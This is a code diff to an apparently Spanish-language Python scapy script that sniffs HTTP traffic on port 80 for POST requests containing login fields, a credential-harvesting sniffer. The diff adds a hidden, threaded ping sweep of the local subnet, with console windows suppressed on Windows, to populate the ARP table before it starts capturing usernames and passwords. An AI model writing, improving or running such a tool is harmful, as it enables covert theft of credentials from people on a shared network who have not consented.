@@ -2,6 +2,9 @@ from scapy.all import sniff, IP, TCP, Raw, IFACES
 from urllib.parse import unquote_plus
 import re
 import socket
+import subprocess
+import threading
+import time
 
 # Palabras clave comunes en formularios de login
 KEYWORDS = ["username", "user", "email", "login",
@@ -81,23 +84,52 @@ def detectar_interfaz():
         s.close()
     except Exception:
         print("[!] No se pudo determinar la IP local.")
-        return None, None
+        return None, None, None
 
     for k, v in IFACES.items():
         try:
             if hasattr(v, 'ip') and v.ip == mi_ip:
                 nombre = getattr(v, 'name', k)
-                return k, nombre
+                return k, nombre, mi_ip
         except Exception:
             continue
-    return None, None
+    return None, None, mi_ip
+
+
+def forzar_descubrimiento(mi_ip):
+    partes = mi_ip.split(".")
+    if len(partes) != 4: return
+    base = f"{partes[0]}.{partes[1]}.{partes[2]}"
+    print(f"[*] Forzando descubrimiento de red en {base}.0/24 (Ping Sweep)...")
+    
+    def hacer_ping(ip):
+        try:
+            # 0x08000000 = CREATE_NO_WINDOW evita consolas negras en Windows
+            subprocess.call(["ping", "-n", "1", "-w", "300", ip], 
+                            stdout=subprocess.DEVNULL, 
+                            stderr=subprocess.DEVNULL,
+                            creationflags=0x08000000)
+        except: pass
+
+    hilos = []
+    for i in range(1, 255):
+        t = threading.Thread(target=hacer_ping, args=(f"{base}.{i}",))
+        t.daemon = True
+        t.start()
+        hilos.append(t)
+    
+    time.sleep(3)
+    print("[*] Descubrimiento completado. Iniciando sniffer...")
 
 
 def main():
-    INTERFAZ, nombre = detectar_interfaz()
+    INTERFAZ, nombre, mi_ip = detectar_interfaz()
     if not INTERFAZ:
-        print("[!] No se encontro una interfaz activa.")
+        print("[!] No se encontró una interfaz activa.")
         return
+
+    # Forzar descubrimiento para que la tabla ARP esté poblada
+    forzar_descubrimiento(mi_ip)
 
     print(f"\n[*] Escuchando en {nombre} — puerto 80 (HTTP)")
     print("[*] Esperando peticiones POST con credenciales...\n")
